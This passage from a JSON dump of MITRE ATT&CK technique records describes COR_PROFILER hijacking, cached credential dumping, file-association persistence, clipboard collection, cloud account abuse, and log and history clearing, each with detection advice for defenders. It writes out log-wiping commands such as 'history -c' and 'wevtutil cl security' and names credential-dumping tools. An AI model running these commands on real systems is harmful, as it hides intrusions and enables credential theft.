2017)\",\"external_references\":[{\"external_id\":\"T1574.012\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1574/012\"},{\"description\":\"Microsoft. (2017, March 30). Profiling Overview. Retrieved June 24, 2020.\",\"source_name\":\"Microsoft Profiling Mar 2017\",\"url\":\"https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/profiling-overview\"},{\"description\":\"Microsoft. (2013, February 4). Registry-Free Profiler Startup and Attach. Retrieved June 24, 2020.\",\"source_name\":\"Microsoft COR_PROFILER Feb 2013\",\"url\":\"https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ee471451(v=vs.100)\"},{\"description\":\"Lambert, T. (2020, May 7). Introducing Blue Mockingbird. Retrieved May 26, 2020.\",\"source_name\":\"RedCanary Mockingbird May 2020\",\"url\":\"https://redcanary.com/blog/blue-mockingbird-cryptominer/\"},{\"description\":\"Brown, J. (2020, May 7). Detecting COR_PROFILER manipulation for persistence. Retrieved June 24, 2020.\",\"source_name\":\"Red Canary COR_PROFILER May 2020\",\"url\":\"https://redcanary.com/blog/cor_profiler-for-persistence/\"},{\"description\":\"Almond. (2019, April 30). UAC bypass via elevated .NET applications. Retrieved June 24, 2020.\",\"source_name\":\"Almond COR_PROFILER Apr 2019\",\"url\":\"https://offsec.almond.consulting/UAC-bypass-dotnet.html\"},{\"description\":\"Yair, O. (2019, August 19). Invisi-Shell. Retrieved June 24, 2020.\",\"source_name\":\"GitHub OmerYa Invisi-Shell\",\"url\":\"https://github.com/OmerYa/Invisi-Shell\"},{\"description\":\"Smith, C. (2017, May 18). Subvert CLR Process Listing With .NET Profilers. Retrieved June 24, 2020.\",\"source_name\":\"subTee .NET Profilers May 2017\",\"url\":\"https://web.archive.org/web/20170720041203/http://subt0x10.blogspot.com/2017/05/subvert-clr-process-listing-with-net.html\"}],\"id\":\"attack-pattern--ffeb0780-356e-4261-b036-cfb6bd234335\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-26T16:09:58.920Z\",\"name\":\"COR_PROFILER\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Jesse Brown, Red Canary\"],\"x_mitre_data_sources\":[\"Windows Registry\",\"File monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"For detecting system and user scope abuse of the COR_PROFILER, monitor the Registry for changes to COR_ENABLE_PROFILING, COR_PROFILER, and COR_PROFILER_PATH that correspond to system and user environment variables that do not correlate to known developer tools. Extra scrutiny should be placed on suspicious modification of these Registry keys by command line tools like wmic.exe, setx.exe, and [Reg](https://attack.mitre.org/software/S0075), monitoring for command-line arguments indicating a change to COR_PROFILER variables may aid in detection. For system, user, and process scope abuse of the COR_PROFILER, monitor for new suspicious unmanaged profiling DLLs loading into .NET processes shortly after the CLR causing abnormal process behavior.(Citation: Red Canary COR_PROFILER May 2020) Consider monitoring for DLL files that are associated with COR_PROFILER environment variables.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-21T15:42:25.991Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.(Citation: Microsoft - Cached Creds)\\n\\nOn Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.(Citation: PassLib mscache) The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to recover the plaintext password.(Citation: ired mscache)\\n\\nWith SYSTEM access, the tools/utilities such as [Mimikatz](https://attack.mitre.org/software/S0002), [Reg](https://attack.mitre.org/software/S0075), and secretsdump.py can be used to extract the cached credentials.\\n\\nNote: Cached credentials for Windows Vista are derived using PBKDF2.(Citation: PassLib mscache)\",\"external_references\":[{\"external_id\":\"T1003.005\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1003/005\"},{\"description\":\"Microsfot. (2016, August 21). Cached and Stored Credentials Technical Overview. Retrieved February 21, 2020.\",\"source_name\":\"Microsoft - Cached Creds\",\"url\":\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v%3Dws.11)\"},{\"description\":\"Eli Collins. (2016, November 25). Windows\' Domain Cached Credentials v2. Retrieved February 21, 2020.\",\"source_name\":\"PassLib mscache\",\"url\":\"https://passlib.readthedocs.io/en/stable/lib/passlib.hash.msdcc2.html\"},{\"description\":\"Mantvydas Baranauskas. (2019, November 16). Dumping and Cracking mscash - Cached Domain Credentials. Retrieved February 21, 2020.\",\"source_name\":\"ired mscache\",\"url\":\"https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials\"},{\"description\":\"PowerSploit. (n.d.). Retrieved December 4, 2014.\",\"source_name\":\"Powersploit\",\"url\":\"https://github.com/mattifestation/PowerSploit\"}],\"id\":\"attack-pattern--6add2ab5-2711-4e9d-87c8-7a0be8531530\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-24T20:41:08.996Z\",\"name\":\"Cached Domain Credentials\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Ed Williams, Trustwave, SpiderLabs\"],\"x_mitre_data_sources\":[\"PowerShell logs\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit\'s Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\\n\\nDetection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:42.222Z\",\"external_references\":[{\"external_id\":\"T1042\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1042\"},{\"external_id\":\"CAPEC-556\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/556.html\"},{\"description\":\"Microsoft. (n.d.). Change which programs Windows 7 uses by default. Retrieved July 26, 2016.\",\"source_name\":\"Microsoft Change Default Programs\",\"url\":\"https://support.microsoft.com/en-us/help/18539/windows-7-change-default-programs\"},{\"description\":\"Microsoft. (n.d.). Specifying File Handlers for File Name Extensions. Retrieved November 13, 2014.\",\"source_name\":\"Microsoft File Handlers\",\"url\":\"http://msdn.microsoft.com/en-us/library/bb166549.aspx\"},{\"description\":\"Plett, C. et al.. (2017, October 15). assoc. Retrieved August 7, 2018.\",\"source_name\":\"Microsoft Assoc Oct 2017\",\"url\":\"https://docs.microsoft.com/windows-server/administration/windows-commands/assoc\"},{\"description\":\"Sioting, S. (2012, October 8). TROJ_FAKEAV.GZD. Retrieved August 8, 2018.\",\"source_name\":\"TrendMicro TROJ-FAKEAV OCT 2012\",\"url\":\"https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_fakeav.gzd\"}],\"id\":\"attack-pattern--68c96494-1a50-403e-8844-69a6af278c68\",\"modified\":\"2020-01-24T13:41:32.520Z\",\"name\":\"Change Default File Association\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-24T13:40:47.282Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access (Citation: Microsoft Change Default Programs) (Citation: Microsoft File Handlers) or by administrators using the built-in assoc utility. (Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\\n\\nSystem file associations are listed under <code>HKEY_CLASSES_ROOT\\\\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\\\\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\\\\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\\\\[handler]\\\\shell\\\\[action]\\\\command</code>. For example: \\n* <code>HKEY_CLASSES_ROOT\\\\txtfile\\\\shell\\\\open\\\\command</code>\\n* <code>HKEY_CLASSES_ROOT\\\\txtfile\\\\shell\\\\print\\\\command</code>\\n* <code>HKEY_CLASSES_ROOT\\\\txtfile\\\\shell\\\\printto\\\\command</code>\\n\\nThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands. (Citation: TrendMicro TROJ-FAKEAV OCT 2012)\",\"external_references\":[{\"external_id\":\"T1546.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1546/001\"},{\"external_id\":\"CAPEC-556\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/556.html\"},{\"description\":\"Microsoft. (n.d.). Change which programs Windows 7 uses by default. Retrieved July 26, 2016.\",\"source_name\":\"Microsoft Change Default Programs\",\"url\":\"https://support.microsoft.com/en-us/help/18539/windows-7-change-default-programs\"},{\"description\":\"Microsoft. (n.d.). Specifying File Handlers for File Name Extensions. Retrieved November 13, 2014.\",\"source_name\":\"Microsoft File Handlers\",\"url\":\"http://msdn.microsoft.com/en-us/library/bb166549.aspx\"},{\"description\":\"Plett, C. et al.. (2017, October 15). assoc. Retrieved August 7, 2018.\",\"source_name\":\"Microsoft Assoc Oct 2017\",\"url\":\"https://docs.microsoft.com/windows-server/administration/windows-commands/assoc\"},{\"description\":\"Sioting, S. (2012, October 8). TROJ_FAKEAV.GZD. Retrieved August 8, 2018.\",\"source_name\":\"TrendMicro TROJ-FAKEAV OCT 2012\",\"url\":\"https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_fakeav.gzd\"}],\"id\":\"attack-pattern--98034fef-d9fb-4667-8dc4-2eab6231724c\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-01-24T13:40:47.282Z\",\"name\":\"Change Default File Association\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Travis Smith, Tripwire\",\"Stefan Kanthak\"],\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"Windows Registry\"],\"x_mitre_detection\":\"Collect and analyze changes to Registry keys that associate file extensions to default applications for execution and correlate with unknown process launch activity or unusual file types for that process.\\n\\nUser file association preferences are stored under <code> [HKEY_CURRENT_USER]\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FileExts</code> and override associations configured under <code>[HKEY_CLASSES_ROOT]</code>. Changes to a user\'s preference will occur under this entry\'s subkeys.\\n\\nAlso look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\",\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1146\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1146\"}],\"id\":\"attack-pattern--d3046a90-580c-4004-8208-66915bc29830\",\"modified\":\"2020-01-31T12:32:52.281Z\",\"name\":\"Clear Command History\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-31T12:32:08.228Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. macOS and Linux both keep track of the commands users type in their terminal so that users can retrace what they\'ve done.\\n\\nThese logs can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user\'s home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they\'ve used before in different sessions.\\n\\nAdversaries can use a variety of methods to prevent their own commands from appear in these logs, such as clearing the history environment variable (<code>unset HISTFILE</code>), setting the command history size to zero (<code>export HISTFILESIZE=0</code>), manually clearing the history (<code>history -c</code>), or deleting the bash history file <code>rm ~/.bash_history</code>.\",\"external_references\":[{\"external_id\":\"T1070.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1070/003\"}],\"id\":\"attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T21:31:03.043Z\",\"name\":\"Clear Command History\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Authentication logs\"],\"x_mitre_defense_bypassed\":[\"Host forensic analysis\",\"Log analysis\"],\"x_mitre_detection\":\"User authentication, especially via remote terminal services like SSH, without new entries in that user\'s <code>~/.bash_history</code> is suspicious. Additionally, the modification of the <code>HISTFILE</code> and <code>HISTFILESIZE</code> environment variables or the removal/clearing of the <code>~/.bash_history</code> file are indicators of suspicious activity.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-01-28T17:11:54.034Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\\n\\n* <code>/var/log/messages:</code>: General and system-related messages\\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\\n* <code>/var/log/kern.log</code>: Kernel logs\\n* <code>/var/log/cron.log</code>: Crond logs\\n* <code>/var/log/maillog</code>: Mail server logs\\n* <code>/var/log/httpd/</code>: Web server access and error logs\\n\",\"external_references\":[{\"external_id\":\"T1070.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1070/002\"},{\"description\":\"Marcel. (2018, April 19). 12 Critical Linux Log Files You Must be Monitoring. Retrieved March 29, 2020.\",\"source_name\":\"Linux Logs\",\"url\":\"https://www.eurovps.com/blog/important-linux-log-files-you-must-be-monitoring/\"}],\"id\":\"attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T21:23:51.886Z\",\"name\":\"Clear Linux or Mac System Logs\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"File system monitoring may be used to detect improper deletion or modification of indicator files. Also monitor for suspicious processes interacting with log files.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-01-28T17:05:14.707Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer\'s alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\\n\\nThe event logs can be cleared with the following utility commands:\\n\\n* <code>wevtutil cl system</code>\\n* <code>wevtutil cl application</code>\\n* <code>wevtutil cl security</code>\\n\\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"external_references\":[{\"external_id\":\"T1070.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1070/001\"},{\"description\":\"Plett, C. et al.. (2017, October 16). wevtutil. Retrieved July 2, 2018.\",\"source_name\":\"Microsoft wevtutil Oct 2017\",\"url\":\"https://docs.microsoft.com/windows-server/administration/windows-commands/wevtutil\"},{\"description\":\"Microsoft. (n.d.). EventLog.Clear Method (). Retrieved July 2, 2018.\",\"source_name\":\"Microsoft EventLog.Clear\",\"url\":\"https://msdn.microsoft.com/library/system.diagnostics.eventlog.clear.aspx\"},{\"description\":\"Microsoft. (n.d.). Clear-EventLog. Retrieved July 2, 2018.\",\"source_name\":\"Microsoft Clear-EventLog\",\"url\":\"https://docs.microsoft.com/powershell/module/microsoft.powershell.management/clear-eventlog\"}],\"id\":\"attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T21:17:03.732Z\",\"name\":\"Clear Windows Event Logs\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"API monitoring\",\"Process command-line parameters\",\"Process monitoring\",\"File monitoring\"],\"x_mitre_defense_bypassed\":[\"Anti Virus\",\"Host Intrusion Prevention Systems\",\"Log Analysis\"],\"x_mitre_detection\":\"Deleting Windows event logs (via native binaries (Citation: Microsoft wevtutil Oct 2017), API functions (Citation: Microsoft EventLog.Clear), or [PowerShell](https://attack.mitre.org/techniques/T1059/001) (Citation: Microsoft Clear-EventLog)) may also generate an alterable event (Event ID 1102: \\\"The audit log was cleared\\\").\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_system_requirements\":[\"Clearing the Windows event logs requires Administrator permissions\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:25.967Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may collect data stored in the clipboard from users copying information within or between applications. \\n\\nIn Windows, Applications can access clipboard data by using the Windows API.(Citation: MSDN Clipboard) OSX provides a native command, <code>pbpaste</code>, to grab clipboard contents.(Citation: Operating with EmPyre)\",\"external_references\":[{\"external_id\":\"T1115\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1115\"},{\"external_id\":\"CAPEC-637\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/637.html\"},{\"description\":\"Microsoft. (n.d.). About the Clipboard. Retrieved March 29, 2016.\",\"source_name\":\"MSDN Clipboard\",\"url\":\"https://msdn.microsoft.com/en-us/library/ms649012\"},{\"description\":\"rvrsh3ll. (2016, May 18). Operating with EmPyre. Retrieved July 12, 2017.\",\"source_name\":\"Operating with EmPyre\",\"url\":\"https://medium.com/rvrsh3ll/operating-with-empyre-ea764eda3363\"}],\"id\":\"attack-pattern--30973a08-aed9-4edf-8604-9084ce1b5c4f\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2020-04-23T18:35:58.230Z\",\"name\":\"Clipboard Data\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"API monitoring\"],\"x_mitre_detection\":\"Access to the clipboard is a legitimate function of many applications on an operating system. If an organization chooses to monitor for this behavior, then the data will likely need to be correlated against other suspicious or non-user-driven activity.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"Windows\",\"macOS\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2020-01-29T17:32:30.711Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.(Citation: Microsoft O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: AWS Create IAM User)(Citation: GCP Create Cloud Identity Users)(Citation: Microsoft Azure AD Users)\\n\\nAdversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.\",\"external_references\":[{\"external_id\":\"T1136.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1136/003\"},{\"description\":\"Ako-Adjei, K., Dickhaus, M., Baumgartner, P., Faigel, D., et. al.. (2019, October 8). About admin roles. Retrieved October 18, 2019.\",\"source_name\":\"Microsoft O365 Admin Roles\",\"url\":\"https://docs.microsoft.com/en-us/office365/admin/add-users/about-admin-roles?view=o365-worldwide\"},{\"description\":\"Microsoft. (n.d.). Add Another Admin. Retrieved October 18, 2019.\",\"source_name\":\"Microsoft Support O365 Add Another Admin, October 2019\",\"url\":\"https://support.office.com/en-us/article/add-another-admin-f693489f-9f55-4bd0-a637-a81ce93de22d\"},{\"description\":\"AWS. (n.d.). Creating an IAM User in Your AWS Account. Retrieved January 29, 2020.\",\"source_name\":\"AWS Create IAM User\",\"url\":\"https://docs.aws.amazon.com/IAM/latest/UserGuide/id_users_create.html\"},{\"description\":\"Google. (n.d.). Create Cloud Identity user accounts. Retrieved January 29, 2020.\",\"source_name\":\"GCP Create Cloud Identity Users\",\"url\":\"https://support.google.com/cloudidentity/answer/7332836?hl=en&ref_topic=7558554\"},{\"description\":\"Microsoft. (2019, November 11). Add or delete users using Azure Active Directory. Retrieved January 30, 2020.\",\"source_name\":\"Microsoft Azure AD Users\",\"url\":\"https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/add-users-azure-active-directory\"}],\"id\":\"attack-pattern--a009cb25-4801-4116-9105-80a91cf15c1b\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-24T12:44:27.995Z\",\"name\":\"Cloud Account\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Praetorian\",\"Microsoft Threat Intelligence Center (MSTIC)\"],\"x_mitre_data_sources\":[\"Office 365 audit logs\",\"Stackdriver logs\",\"Azure activity logs\",\"AWS CloudTrail logs\"],\"x_mitre_detection\":\"Collect usage logs from cloud user and administrator accounts to identify unusual activity in the creation of new accounts and assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"AWS\",\"GCP\",\"Azure\",\"Office 365\",\"Azure AD\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-21T21:08:36.570Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider of SaaS application.\\n\\nWith authenticated access there are several tools that can be used to find accounts. The <code>Get-MsolRoleMember</code> PowerShell cmdlet can be used to obtain account names given a role or permissions group.(Citation: Microsoft msolrolemember)(Citation: GitHub Raindance)\\n\\nAzure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command <code>az ad user list</code> will list all users within a domain.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018) \",\"external_references\":[{\"external_id\":\"T1087.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1087/004\"},{\"description\":\"Microsoft. (n.d.). Get-MsolRoleMember. Retrieved October 6, 2019.\",\"source_name\":\"Microsoft msolrolemember\",\"url\":\"https://docs.microsoft.com/en-us/powershell/module/msonline/get-msolrolemember?view=azureadps-1.0\"},{\"description\":\"Stringer, M.. (2018, November 21). RainDance. Retrieved October 6, 2019.\",\"source_name\":\"GitHub Raindance\",\"url\":\"https://github.com/True-Demon/raindance\"},{\"description\":\"Microsoft. (n.d.). az ad user. Retrieved October 6, 2019.\",\"source_name\":\"Microsoft AZ CLI\",\"url\":\"https://docs.microsoft.com/en-us/cli/azure/ad/user?view=azure-cli-latest\"},{\"description\":\"Felch, M.. (2018, August 31). Red Teaming Microsoft Part 1 Active Directory Leaks via Azure. Retrieved October 6, 2019.\",\"source_name\":\"Black Hills Red Teaming MS AD Azure, 2018\",\"url\":\"https://www.blackhillsinfosec.com/red-teaming-microsoft-part-1-active-directory-leaks-via-azure/\"}],\"id\":\"attack-pattern--8f104855-e5b7-4077-b1f5-bc3103b41abe\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-13T20:05:15.448Z\",\"name\":\"Cloud Account\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Azure activity logs\",\"Office 365 account logs\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\\n\\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"AWS\",\"GCP\",\"Azure\",\"Office 365\",\"Azure AD\",\"SaaS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-13T20:36:57.378Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. In some cases, cloud accounts may be federated with traditional identity management system, such as Window Active Directory.(Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation)\\n\\nCompromised credentials for cloud accounts can be used to harvest sensitive data from online storage accounts and databases. Access to cloud accounts can also be abused to gain Initial Access to a network by abusing a [Trusted Relationship](https://attack.mitre.org/techniques/T1199). Similar to [Domain Accounts](https://attack.mitre.org/techniques/T1078/002), compromise of federated cloud accounts may allow adversaries to more easily move laterally within an environment.\",\"external_references\":[{\"external_id\":\"T1078.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1078/004\"},{\"description\":\"Amazon. (n.d.). Identity Federation in AWS. Retrieved March 13, 2020.\",\"source_name\":\"AWS Identity Federation\",\"url\":\"https://aws.amazon.com/identity/federation/\"},{\"description\":\"Google. (n.d.). Federating Google Cloud with Active Directory. Retrieved March 13, 2020.\",\"source_name\":\"Google Federating GC\",\"url\":\"https://cloud.google.com/solutions/federating-gcp-with-active-directory-introduction\"},{\"description\":\"Microsoft. (n.d.). Deploying Active Directory Federation Services in Azure. Retrieved March 13, 2020.\",\"source_name\":\"Microsoft Deploying AD Federation\",\"url\":\"https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/deployment/how-to-connect-fed-azure-adfs\"}],\"id\":\"attack-pattern--f232fa7a-025c-4d43-abc7-318e81a73d65\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"initial-access\"}],\"modified\":\"2020-03-23T21:59:36.729Z\",\"name\":\"Cloud Accounts\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Azure activity logs\",\"Authentication logs\",\"AWS CloudTrail logs\",\"Stackdriver logs\"],\"x_mitre_detection\":\"Perform regular audits of cloud accounts to detect abnormal or malicious activity, such as accessing information outside of the normal function of the account or account usage at atypical hours.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"AWS\",\"GCP\",\"Azure\",\"SaaS\",\"Azure AD\",\"Office 